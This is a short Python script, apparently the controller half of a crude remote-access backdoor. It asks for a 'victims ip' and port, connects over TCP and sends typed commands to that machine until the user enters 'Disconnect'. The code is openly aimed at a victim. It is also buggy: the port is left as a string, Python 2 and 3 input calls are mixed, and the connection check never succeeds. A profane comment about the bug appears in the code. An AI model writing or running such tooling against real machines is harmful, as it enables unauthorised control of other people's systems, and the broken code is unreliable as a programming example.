#!/usr/bin/python

import socket
import os
import datetime

victim_IP = input('victims ip: ' )
host = victim_IP
port = input('port: ')
addr = (victim_IP, port)
socket1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if(socket1.connect(addr)): #passed type string to int var FUCCCCCCCCCCCCCCC
    print("Connected")
text_finished = "Disconnect"
file_text = ""
while file_text != text_finished:
        file_text = raw_input("Command line: \n")
        socket1.send(file_text)
        if file_text == text_finished:
            break
